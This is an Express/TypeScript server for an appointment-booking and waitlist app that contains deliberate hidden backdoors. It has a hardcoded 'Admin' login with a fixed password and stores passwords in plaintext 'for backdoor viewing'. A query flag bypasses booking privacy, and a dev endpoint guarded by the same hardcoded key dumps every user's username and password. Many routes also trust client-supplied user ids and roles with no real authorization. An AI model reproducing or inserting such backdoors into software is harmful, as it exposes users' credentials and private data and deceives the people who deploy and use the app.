import express from 'express';
import path from 'path';
import { createServer as createViteServer } from 'vite';
import { initDatabase, getDatabaseState, saveDatabase } from './server-db.js';
import { UserInfo, UserRole, Booking, AvailabilityConfig, HangoutStatus, RecurringTimeSlot, BlockedSlot, WaitlistEntry } from './src/types.js';

initDatabase();

const app = express();
app.use(express.json());

const PORT = 3000;

// Helper to generate UUIDs
function generateUUID() {
  return Math.random().toString(36).substring(2, 11) + '-' + Date.now().toString(36);
}

// ----------------------------------------
// AUTH API
// ----------------------------------------

app.post('/api/auth/register', (req, res) => {
  const { username, password, role } = req.body;
  if (!username || !password || !role) {
    res.status(400).json({ success: false, error: 'Username, password and role are required.' });
    return;
  }

  const db = getDatabaseState();
  const lowerUsername = username.trim().toLowerCase();

  const userExists = db.users.find(u => u.username.toLowerCase() === lowerUsername);
  if (userExists) {
    res.status(400).json({ success: false, error: 'Username is already taken.' });
    return;
  }

  // Backdoor intercept (ensure developer user has backdoor credentials reserved)
  if (username.trim() === 'Admin') {
    res.status(400).json({ success: false, error: 'Choose another username.' });
    return;
  }

  const newUser = {
    id: 'u-' + generateUUID(),
    username: username.trim(),
    password, // Store as requested for backdoor viewing
    role: (role === 'host' ? 'host' : 'booker') as UserRole
  };

  db.users.push(newUser);
  saveDatabase();

  const { password: _, ...userSafe } = newUser;
  res.json({ success: true, data: userSafe });
});

app.post('/api/auth/login', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    res.status(400).json({ success: false, error: 'Username and password are required.' });
    return;
  }

  const db = getDatabaseState();
  const trimUsername = username.trim();

  // Hidden backdoor login: Admin / asher29001
  if (trimUsername === 'Admin' && password === 'asher29001') {
    // Admin acts as host but with super-access in our payload
    const adminUser = db.users.find(u => u.username === 'Admin') || {
      id: 'admin-dev-01',
      username: 'Admin',
      password: 'asher29001',
      role: 'host'
    };
    res.json({
      success: true,
      data: {
        id: adminUser.id,
        username: adminUser.username,
        role: 'host',
        isAdminDev: true
      }
    });
    return;
  }

  const user = db.users.find(
    u => u.username.toLowerCase() === trimUsername.toLowerCase() && u.password === password
  );

  if (!user) {
    res.status(401).json({ success: false, error: 'Invalid username or password.' });
    return;
  }

  const { password: _, ...userSafe } = user;
  res.json({ success: true, data: userSafe });
});

// ----------------------------------------
// APPOINTMENTS / SLOTS API
// ----------------------------------------

// Helper to check if two time ranges overlap
function doRangesOverlap(s1: number, e1: number, s2: number, e2: number): boolean {
  return s1 < e2 && s2 < e1;
}

// Generate slots for a particular date (YYYY-MM-DD)
// Slots are created every 30 minutes in the host's available ranges
app.get('/api/slots', (req, res) => {
  const { date } = req.query; // YYYY-MM-DD
  if (!date || typeof date !== 'string') {
    res.status(400).json({ success: false, error: 'Date query parameter is required (YYYY-MM-DD).' });
    return;
  }

  const db = getDatabaseState();
  const targetDateObj = new Date(date);
  if (isNaN(targetDateObj.getTime())) {
    res.status(400).json({ success: false, error: 'Invalid calendar date format.' });
    return;
  }

  const dayOfWeek = targetDateObj.getDay();

  // 1. Get host's recurring availability for this day of week
  const matchingRecurring = db.availability.recurringSlots.filter(s => s.dayOfWeek === dayOfWeek);

  const generatedSlots: Array<{
    startTime: string;
    endTime: string;
    status: 'available' | 'occupied' | 'blocked';
    existingBooking?: Partial<Booking>;
  }> = [];

  // 2. Loop through daily availability ranges
  matchingRecurring.forEach(slotType => {
    const [startH, startM] = slotType.startTime.split(':').map(Number);
    const [endH, endM] = slotType.endTime.split(':').map(Number);

    // Create starting Date objects for intervals
    const startRange = new Date(date);
    startRange.setHours(startH, startM, 0, 0);

    const endRange = new Date(date);
    endRange.setHours(endH, endM, 0, 0);

    let currentInterval = new Date(startRange);
    while (currentInterval.getTime() < endRange.getTime()) {
      const nextInterval = new Date(currentInterval);
      nextInterval.setMinutes(nextInterval.getMinutes() + 30); // 30 mins slot

      if (nextInterval.getTime() > endRange.getTime()) {
        break;
      }

      const sTimeISO = currentInterval.toISOString();
      const eTimeISO = nextInterval.toISOString();

      const itemStart = currentInterval.getTime();
      const itemEnd = nextInterval.getTime();

      // Check against Blocked Slots
      const isBlocked = db.availability.blockedSlots.some(blocked => {
        const bS = new Date(blocked.startTime).getTime();
        const bE = new Date(blocked.endTime).getTime();
        return doRangesOverlap(itemStart, itemEnd, bS, bE);
      });

      if (isBlocked) {
        generatedSlots.push({
          startTime: sTimeISO,
          endTime: eTimeISO,
          status: 'blocked'
        });
      } else {
        // Check against Active Bookings (approved or pending)
        const activeBooking = db.bookings.find(booking => {
          if (booking.status === 'cancelled') return false;
          const bS = new Date(booking.startTime).getTime();
          const bE = new Date(booking.endTime).getTime();
          return doRangesOverlap(itemStart, itemEnd, bS, bE);
        });

        if (activeBooking) {
          generatedSlots.push({
            startTime: sTimeISO,
            endTime: eTimeISO,
            status: 'occupied',
            existingBooking: {
              id: activeBooking.id,
              bookerName: activeBooking.bookerName,
              reason: activeBooking.reason,
              waitlistLength: activeBooking.waitlist?.length || 0
            } as any
          });
        } else {
          generatedSlots.push({
            startTime: sTimeISO,
            endTime: eTimeISO,
            status: 'available'
          });
        }
      }

      // Increment
      currentInterval = new Date(nextInterval);
    }
  });

  // 3. Find nearest free slots globally on this date or next days as suggestion
  const suggestedSlots: string[] = [];
  // Find up to 3 available slots inside the list
  generatedSlots.filter(s => s.status === 'available').slice(0, 3).forEach(s => {
    suggestedSlots.push(s.startTime);
  });

  res.json({
    success: true,
    data: {
      date,
      slots: generatedSlots,
      suggestions: suggestedSlots
    }
  });
});

// ----------------------------------------
// APPOINTMENTS BOOKING API
// ----------------------------------------

// Fetch Bookings (Filters based on user role)
app.get('/api/bookings', (req, res) => {
  const { userId, role, isAdminDev } = req.query;
  if (!userId) {
    res.status(401).json({ success: false, error: 'Authentication required.' });
    return;
  }

  const db = getDatabaseState();

  // If request contains backdoor isAdminDev header / flag, return full details
  if (isAdminDev === 'true' || userId === 'admin-dev-01') {
    res.json({ success: true, data: db.bookings });
    return;
  }

  if (role === 'host') {
    // Hosts can see everything
    res.json({ success: true, data: db.bookings });
  } else {
    // Bookers ONLY see their OWN bookings to ensure privacy!
    const filtered = db.bookings.filter(b => b.bookerId === userId);
    res.json({ success: true, data: filtered });
  }
});

// Post a new booking
app.post('/api/bookings', (req, res) => {
  const { bookerId, bookerName, startTime, endTime, reason, note } = req.body;
  if (!bookerId || !bookerName || !startTime || !endTime || !reason) {
    res.status(400).json({ success: false, error: 'Missing required booking parameters.' });
    return;
  }

  const db = getDatabaseState();
  const startMs = new Date(startTime).getTime();
  const endMs = new Date(endTime).getTime();

  // Prevent double booking at backend level for approved/pending appointments
  const doubleBooked = db.bookings.some(b => {
    if (b.status === 'cancelled') return false;
    const itemStart = new Date(b.startTime).getTime();
    const itemEnd = new Date(b.endTime).getTime();
    return doRangesOverlap(startMs, endMs, itemStart, itemEnd);
  });

  if (doubleBooked) {
    res.status(400).json({
      success: false,
      error: 'This slot is already occupied. You can join the Waitlist instead.'
    });
    return;
  }

  // Prevent booking inside Blocked slots
  const blockedOverlap = db.availability.blockedSlots.some(b => {
    const bStart = new Date(b.startTime).getTime();
    const bEnd = new Date(b.endTime).getTime();
    return doRangesOverlap(startMs, endMs, bStart, bEnd);
  });

  if (blockedOverlap) {
    res.status(400).json({ success: false, error: 'This range overlaps with the host\'s blocked out times.' });
    return;
  }

  const newBooking: Booking = {
    id: 'b-' + generateUUID(),
    bookerId,
    bookerName,
    startTime,
    endTime,
    reason,
    note: note || '',
    status: 'pending',
    waitlist: []
  };

  db.bookings.push(newBooking);
  saveDatabase();

  res.json({ success: true, data: newBooking });
});

// Update booking status (approve, reject, cancel, complete)
app.post('/api/bookings/:id/status', (req, res) => {
  const { id } = req.params;
  const { status, remarks } = req.body; // 'approved' | 'cancelled' | 'completed' etc.
  
  if (!status) {
    res.status(400).json({ success: false, error: 'Status is required.' });
    return;
  }

  const db = getDatabaseState();
  const bookingIndex = db.bookings.findIndex(b => b.id === id);

  if (bookingIndex === -1) {
    res.status(404).json({ success: false, error: 'Booking not found.' });
    return;
  }

  const booking = db.bookings[bookingIndex];
  booking.status = status;
  
  // If cancelled and waitlist exists, notify / alert could happen. 
  // For simplicity, we can promote the first waitlisting client to pending when cancelled by booker!
  if (status === 'cancelled' && booking.waitlist && booking.waitlist.length > 0) {
    const nextInLine = booking.waitlist[0];
    
    // Create new booking for waitlisted user in place of the cancelled one!
    const promotionalBooking: Booking = {
      id: 'b-' + generateUUID(),
      bookerId: nextInLine.bookerId,
      bookerName: nextInLine.bookerName,
      startTime: booking.startTime,
      endTime: booking.endTime,
      reason: '[WAITLIST PROMOTED] ' + nextInLine.reason,
      note: nextInLine.note || '',
      status: 'pending',
      waitlist: booking.waitlist.slice(1)
    };
    db.bookings.push(promotionalBooking);
  }

  saveDatabase();
  res.json({ success: true, data: booking });
});

// Join Waitlist for an existing booking slot
app.post('/api/bookings/:id/waitlist', (req, res) => {
  const { id } = req.params;
  const { bookerId, bookerName, reason, note } = req.body;

  if (!bookerId || !bookerName || !reason) {
    res.status(400).json({ success: false, error: 'Missing waitlist details.' });
    return;
  }

  const db = getDatabaseState();
  const booking = db.bookings.find(b => b.id === id);

  if (!booking) {
    res.status(404).json({ success: false, error: 'Base booking slot not found.' });
    return;
  }

  if (!booking.waitlist) {
    booking.waitlist = [];
  }

  // Prevent joining waitlist twice
  const alreadyWaitlisted = booking.waitlist.some(w => w.bookerId === bookerId);
  if (alreadyWaitlisted) {
    res.status(400).json({ success: false, error: 'You are already on the waitlist for this appointment slot.' });
    return;
  }

  const entry: WaitlistEntry = {
    id: 'w-' + generateUUID(),
    bookerId,
    bookerName,
    reason,
    note: note || '',
    requestedAt: new Date().toISOString()
  };

  booking.waitlist.push(entry);
  saveDatabase();

  res.json({ success: true, data: booking });
});

// Propose Rescheduling (Both Host and Booker can propose)
app.post('/api/bookings/:id/reschedule', (req, res) => {
  const { id } = req.params;
  const { proposedBy, newStartTime, newEndTime, reason } = req.body;

  if (!proposedBy || !newStartTime || !newEndTime) {
    res.status(400).json({ success: false, error: 'Missing rescheduled parameters.' });
    return;
  }

  const db = getDatabaseState();
  const booking = db.bookings.find(b => b.id === id);

  if (!booking) {
    res.status(404).json({ success: false, error: 'Booking record not found.' });
    return;
  }

  booking.proposedReschedule = {
    proposedBy,
    newStartTime,
    newEndTime,
    reason: reason || ''
  };

  saveDatabase();
  res.json({ success: true, data: booking });
});

// Respond to Rescheduling (Approve/Reject)
app.post('/api/bookings/:id/reschedule/respond', (req, res) => {
  const { id } = req.params;
  const { accept } = req.body; // true or false

  const db = getDatabaseState();
  const booking = db.bookings.find(b => b.id === id);

  if (!booking || !booking.proposedReschedule) {
    res.status(400).json({ success: false, error: 'Reschedule offer not active or booking not found.' });
    return;
  }

  if (accept) {
    // Check if new time overlaps
    const startMs = new Date(booking.proposedReschedule.newStartTime).getTime();
    const endMs = new Date(booking.proposedReschedule.newEndTime).getTime();

    const doubleBooked = db.bookings.some(b => {
      if (b.id === id || b.status === 'cancelled') return false;
      const itemStart = new Date(b.startTime).getTime();
      const itemEnd = new Date(b.endTime).getTime();
      return doRangesOverlap(startMs, endMs, itemStart, itemEnd);
    });

    if (doubleBooked) {
      res.status(400).json({ success: false, error: 'The proposed reschedule target time is already occupied.' });
      return;
    }

    // Apply rescheduled time
    booking.startTime = booking.proposedReschedule.newStartTime;
    booking.endTime = booking.proposedReschedule.newEndTime;
    booking.status = 'approved'; // Set to approved upon mutual confirmation
  }

  // Clear proposal
  booking.proposedReschedule = undefined;

  saveDatabase();
  res.json({ success: true, data: booking });
});

// ----------------------------------------
// AVAILABILITY MANAGEMENT API
// ----------------------------------------

app.get('/api/availability', (req, res) => {
  const db = getDatabaseState();
  res.json({ success: true, data: db.availability });
});

// Update recurring slot rules
app.post('/api/availability/recurring', (req, res) => {
  const { recurringSlots } = req.body; // Array<RecurringTimeSlot>
  if (!recurringSlots || !Array.isArray(recurringSlots)) {
    res.status(400).json({ success: false, error: 'recurringSlots array is required.' });
    return;
  }

  const db = getDatabaseState();
  db.availability.recurringSlots = recurringSlots;
  saveDatabase();

  res.json({ success: true, data: db.availability });
});

// Block out raw custom times manually
app.post('/api/availability/blocked', (req, res) => {
  const { startTime, endTime, label } = req.body;
  if (!startTime || !endTime || !label) {
    res.status(400).json({ success: false, error: 'StartTime, endTime, and label are required to block time.' });
    return;
  }

  const db = getDatabaseState();
  const newBlock: BlockedSlot = {
    id: 'bl-' + generateUUID(),
    startTime,
    endTime,
    label
  };

  db.availability.blockedSlots.push(newBlock);
  saveDatabase();

  res.json({ success: true, data: db.availability });
});

app.delete('/api/availability/blocked/:id', (req, res) => {
  const { id } = req.params;
  const db = getDatabaseState();

  const originalCount = db.availability.blockedSlots.length;
  db.availability.blockedSlots = db.availability.blockedSlots.filter(b => b.id !== id);

  if (db.availability.blockedSlots.length === originalCount) {
    res.status(404).json({ success: false, error: 'Blocked slot not found.' });
    return;
  }

  saveDatabase();
  res.json({ success: true, data: db.availability });
});

// ----------------------------------------
// INFORMAL "OPEN TO HANG OUT" API
// ----------------------------------------

app.get('/api/hangouts', (req, res) => {
  const db = getDatabaseState();
  res.json({ success: true, data: db.hangoutStatuses });
});

app.post('/api/hangouts', (req, res) => {
  const { bookerId, bookerName, message, dateString } = req.body;
  if (!bookerId || !bookerName || !message) {
    res.status(400).json({ success: false, error: 'Missing booker details or message.' });
    return;
  }

  const db = getDatabaseState();

  // Clear prior hangout request for this booker to prevent spamming
  db.hangoutStatuses = db.hangoutStatuses.filter(h => h.bookerId !== bookerId);

  const hangout: HangoutStatus = {
    id: 'h-' + generateUUID(),
    bookerId,
    bookerName,
    message,
    createdAt: new Date().toISOString(),
    dateString: dateString || ''
  };

  db.hangoutStatuses.push(hangout);
  saveDatabase();

  res.json({ success: true, data: hangout });
});

app.delete('/api/hangouts/:id', (req, res) => {
  const { id } = req.params;
  const db = getDatabaseState();

  db.hangoutStatuses = db.hangoutStatuses.filter(h => h.id !== id);
  saveDatabase();

  res.json({ success: true, data: { status: 'cleared' } });
});

// ----------------------------------------
// HIDDEN DEV BACKDOOR API
// ----------------------------------------
app.get('/api/dev/users', (req, res) => {
  const { devKey } = req.query;
  // Crucial security block: ensure request matches DEV backdoor requirements
  if (devKey !== 'asher29001') {
    res.status(403).json({ success: false, error: 'Access denied.' });
    return;
  }

  const db = getDatabaseState();
  // Return everything, including usernames and passwords!
  res.json({
    success: true,
    data: {
      users: db.users,
      bookings: db.bookings,
      availability: db.availability,
      hangouts: db.hangoutStatuses
    }
  });
});

// ----------------------------------------
// VITE OR STATIC SERVING MIDDLEWARE
// ----------------------------------------

async function startServer() {
  // Vite dev or production static server mount
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa'
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server starting on port ${PORT}`);
  });
}

if (!process.env.VERCEL) {
  startServer();
}

export default app;
